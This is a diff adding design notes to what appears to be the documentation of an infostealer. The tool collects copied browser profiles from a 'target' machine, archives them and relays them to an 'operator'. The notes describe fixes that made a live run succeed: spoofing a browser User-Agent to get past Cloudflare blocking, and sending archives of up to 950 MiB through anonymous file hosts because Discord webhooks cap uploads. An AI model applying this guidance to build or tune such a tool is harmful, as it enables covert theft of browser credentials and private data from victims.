@@ -698,5 +698,61 @@ list and keeps `http_only` as a field. No separate collector is owed, and writin
 that guessed at an app-specific path would be inventing a location that does not exist
 on the target.
 
+## Three things only a live run could find
+
+Every test in this repository builds its own fixture. A fixture is written by the same
+person who wrote the code, so it encodes the same assumptions. One end-to-end run
+against a real machine and a real endpoint found three faults that had been passing
+154 green checks.
+
+**The archive rejected its own config.** `core/schema.py` carries
+`from __future__ import annotations`, so every annotation is a string, and `dataclasses`
+resolves those strings through `sys.modules` while it processes each class. The loader
+exec'd the schema member and registered it afterwards. Unregistered, that lookup returns
+`None` and the decorator raises `AttributeError` halfway through the module body — so
+every built artifact printed `config rejected` and exited 1 within two seconds. The
+fix is three lines of ordering in `agent/config.py`. The reason no test caught it is
+that every test imported `core.schema` directly, which is the one path a target never
+takes.
+
+**A file dated before 1980 killed the zip.** The zip format's epoch is 1980, and
+`ZipFile.write` copies each file's mtime into its entry. Copied browser profiles are
+full of 1601-epoch files, because 1601 is Windows' zero and an installer or an image
+unpack produces them. The run collected 8,740 items and then died assembling them.
+`util.make_archive` now writes through an explicit `ZipInfo` with a fixed epoch, which
+also makes two runs over the same tree produce comparable members.
+
+**Cloudflare answered the upload with 403.** `relay.py` never set a User-Agent, so
+urllib sent `Python-urllib/3.12`, and Cloudflare has a rule that answers exactly that
+string with `403` and the body `error code: 1010`. The webhook was fine; the request
+never reached it. Verified side by side on one URL with one body: default agent 403,
+browser agent 204.
+
+## A webhook cannot carry a profile, so there is a third relay kind
+
+Measured: a full run on the development machine produces a **440 MB** archive. A
+Discord webhook takes 10 MB. That is not a tuning problem, and no amount of chunking
+turns it into one — 44 parts is a reassembly chore handed to the operator on every run.
+
+So `link` is a relay kind of its own. It uploads the archive to an anonymous host and
+posts only the URL. Two hosts, chosen by size, because they have different lifetimes and
+the difference matters more than the size:
+
+- **catbox** for anything up to 190 MiB. Files persist indefinitely.
+- **litterbox** for anything up to 950 MiB. Files expire in 72 hours.
+
+An archive above 950 MiB is refused with the ceiling named. Both hosts answered a
+multipart `fileToUpload` and returned a bare URL as plain text, which is why they are
+used instead of an authenticated bucket — the endpoint list stays at one field and
+nothing in the container has to hold a storage credential.
+
+The timeout is sized from the body rather than fixed. 10 s is right for a message and
+wrong for 400 MB; `_upload_timeout` assumes 128 KiB/s as a floor and clamps at 30
+minutes, so a slow but working uplink is not mistaken for a failure and a wedged socket
+still ends.
+
+A host answering 200 with an HTML error page is the failure this checks for by demanding
+a scheme in the response, not by testing for non-empty.
+
 
 
